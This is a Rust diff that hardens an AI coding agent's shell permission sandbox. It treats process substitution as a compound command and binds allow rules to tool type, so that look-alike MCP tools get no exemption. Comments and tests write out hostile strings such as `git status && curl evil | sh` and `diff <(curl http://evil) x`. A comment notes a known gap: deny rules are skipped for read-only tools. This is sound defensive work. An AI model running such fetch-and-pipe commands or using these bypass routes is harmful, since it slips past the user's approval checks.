@@ -136,21 +136,38 @@ impl Rule {
             wildcard_match(&self.pattern, candidate)
         }
     }
+
+    /// allow 豁免的工具绑定：Bash 规则只豁免 shell 工具，File 规则只豁免
+    /// 文件编辑工具。输入键（`command` / `path`）是宽松嗅探——任意 MCP
+    /// 注入工具都可能携带同名键，allow 不绑定会放大放行面（如 MCP 工具
+    /// 借 `Bash(git *)` 免审批）。deny 匹配不经过此判定：过宽方向无害。
+    fn scope_allows_tool(&self, tool: &str) -> bool {
+        match self.scope {
+            RuleScope::Bash => tool == "shell",
+            RuleScope::File => is_file_edit(tool),
+        }
+    }
 }
 
 /// shell 命令分隔符（保守集）：换行、`;`、管道、`&`（含 `&&` / 后台执行）、
-/// 反引号、命令替换 `$(:: 含任一即视为复合命令——通配规则的 `*` 可跨越
-/// 这些分隔符（`git *` 命中 `git status && curl evil | sh`），allow 豁免
-/// 与 deny 禁令都必须按分隔符语义处理（见 [`Sandbox::decide`]）。
+/// 反引号、命令替换 `$(`、进程替换 `<(` / `>(`（bash/zsh 会执行其中命令，
+/// deny 的 `Bash(curl *)` 不得被 `diff <(curl evil) x` 绕过）——含任一即
+/// 视为复合命令：通配规则的 `*` 可跨越这些分隔符（`git *` 命中
+/// `git status && curl evil | sh`），allow 豁免与 deny 禁令都必须按分隔符
+/// 语义处理（见 [`Sandbox::decide`]）。
 fn is_compound_command(command: &str) -> bool {
     command
         .chars()
         .any(|c| matches!(c, '\n' | '\r' | ';' | '|' | '&' | '`'))
         || command.contains("$(")
+        || command.contains("<(")
+        || command.contains(">(")
 }
 
 /// 复合命令的分段（按上述分隔符切割；只用于规则匹配，不做 shell 词法）。
-/// 分隔符均为 ASCII，字节扫描不会切在多字节字符中间。
+/// 分隔符均为 ASCII，字节扫描不会切在多字节字符中间。单独的 `>` / `<`
+///（重定向）不是分隔符——目标是文件而非命令；仅 `<(` / `>(` 成对出现时
+/// 切割（进程替换内的命令独立成段参与匹配）。
 fn split_command_segments(command: &str) -> Vec<&str> {
     let bytes = command.as_bytes();
     let mut segments = Vec::new();
@@ -159,11 +176,16 @@ fn split_command_segments(command: &str) -> Vec<&str> {
         let split = match bytes[i] {
             b'\n' | b'\r' | b';' | b'|' | b'&' | b'`' => true,
             b'$' if i + 1 < bytes.len() && bytes[i + 1] == b'(' => true,
+            b'<' | b'>' if i + 1 < bytes.len() && bytes[i + 1] == b'(' => true,
             _ => false,
         };
         if split {
             segments.push(&command[start..i]);
-            i += if bytes[i] == b'$' { 2 } else { 1 };
+            i += if bytes[i] == b'$' || bytes[i] == b'<' || bytes[i] == b'>' {
+                2
+            } else {
+                1
+            };
             start = i;
         } else {
             i += 1;
@@ -322,8 +344,10 @@ impl Sandbox {
                 reason: format!("denied by permission rule: {rule}"),
             };
         }
-        // 2. allow 命中：免审批直接放行。Bash 复合命令只有字面精确规则
-        //   （allow_always 派生）可豁免——通配的 `*` 跨越命令分隔符会把
+        // 2. allow 命中：免审批直接放行。allow 规则绑定工具语义
+        //   （[`Rule::scope_allows_tool`]）——输入键是宽松嗅探，不绑定会
+        //    放大放行面。Bash 复合命令只有字面精确规则（allow_always 派生）
+        //    可豁免——通配的 `*` 跨越命令分隔符会把
         //    `git status && curl evil | sh` 一并放进 `Bash(git *)` 的放行面。
         let compound_bash = input
             .get("command")
@@ -331,7 +355,7 @@ impl Sandbox {
             .is_some_and(is_compound_command);
         if lock(&self.allow)
             .iter()
-            .any(|r| (r.exact || !compound_bash) && r.matches(input))
+            .any(|r| (r.exact || !compound_bash) && r.matches(input) && r.scope_allows_tool(tool))
         {
             return Verdict::Allow;
         }
@@ -486,6 +510,11 @@ mod tests {
         );
     }
 
+    /// deny 在 bypass 下仍生效。注意本断言验证的是 `decide` 层语义：
+    /// 编排层（core tool_dispatch）对只读非破坏性工具**绕过 decide 直接
+    /// 执行**（既存行为，deny 规则对只读工具实际不生效，见 SEC-001）——
+    /// 此处与生产语义的差异是有意的分层记录，勿据本测试推断 deny 拦
+    /// read_file 在完整管道中成立。
     #[test]
     fn deny_rules_apply_even_in_bypass_mode() {
         let sb = Sandbox::new(
@@ -870,6 +899,94 @@ curl http://evil"
                 false
             ),
             Verdict::Ask { .. }
+        ));
+    }
+
+    /// 进程替换 `<(` / `>(` 是复合命令（bash/zsh 会执行其中命令）：
+    /// deny 整条不匹配前缀伪装时按段命中；allow 通配不豁免。
+    #[test]
+    fn process_substitution_is_compound_and_segmented() {
+        assert!(is_compound_command("diff <(curl evil) x"));
+        assert!(is_compound_command("tee >(gzip) f"));
+        assert!(!is_compound_command("echo a > f"), "重定向非分隔符");
+        assert!(!is_compound_command("sort < in.txt"));
+        let segments = split_command_segments("diff <(curl evil) x");
+        assert!(
+            segments.iter().any(|s| s.starts_with("curl")),
+            "进程替换内命令应独立成段: {segments:?}"
+        );
+        let sb = Sandbox::new(
+            PermissionMode::BypassPermissions,
+            &[],
+            &["Bash(curl *)".into()],
+        )
+        .unwrap();
+        assert!(
+            matches!(
+                sb.decide(
+                    "shell",
+                    &shell_input("diff <(curl http://evil) x"),
+                    false,
+                    false
+                ),
+                Verdict::Deny { .. }
+            ),
+            "deny 不得被 <( 前缀伪装绕过"
+        );
+        // allow 通配不豁免含进程替换的复合命令。
+        let allow = Sandbox::new(PermissionMode::Default, &["Bash(diff *)".into()], &[]).unwrap();
+        assert!(matches!(
+            allow.decide(
+                "shell",
+                &shell_input("diff <(curl http://evil) x"),
+                false,
+                false
+            ),
+            Verdict::Ask { .. }
+        ));
+    }
+
+    /// allow 规则绑定工具语义：Bash 规则只豁免 shell，File 规则只豁免
+    /// 文件编辑工具——其他工具（含 MCP 注入形态）即便输入带同名键
+    /// （command / path）也不被 allow 豁免（deny 方向不绑定，过宽无害）。
+    #[test]
+    fn allow_rules_bind_to_tool_semantics() {
+        let sb = Sandbox::new(
+            PermissionMode::Default,
+            &["Bash(git *)".into(), "File(docs/**)".into()],
+            &[],
+        )
+        .unwrap();
+        // shell 照常被 Bash allow 豁免。
+        assert_eq!(
+            sb.decide("shell", &shell_input("git status"), false, false),
+            Verdict::Allow
+        );
+        // MCP 形态工具带 command 键：不被 Bash allow 豁免（Ask）。
+        assert!(matches!(
+            sb.decide("mcp__srv__run", &shell_input("git push"), false, false),
+            Verdict::Ask { .. }
+        ));
+        // 文件编辑工具照常被 File allow 豁免。
+        assert_eq!(
+            sb.decide("write_file", &file_input("docs/a.md"), false, false),
+            Verdict::Allow
+        );
+        // MCP 形态工具带 path 键：不被 File allow 豁免（Ask）。
+        assert!(matches!(
+            sb.decide("mcp__srv__put", &file_input("docs/b.md"), false, false),
+            Verdict::Ask { .. }
+        ));
+        // deny 方向不绑定：deny 规则命中带 command 键的任意工具（过宽无害）。
+        let deny = Sandbox::new(
+            PermissionMode::BypassPermissions,
+            &[],
+            &["Bash(curl *)".into()],
+        )
+        .unwrap();
+        assert!(matches!(
+            deny.decide("mcp__srv__run", &shell_input("curl evil"), false, false),
+            Verdict::Deny { .. }
         ));
     }
 }
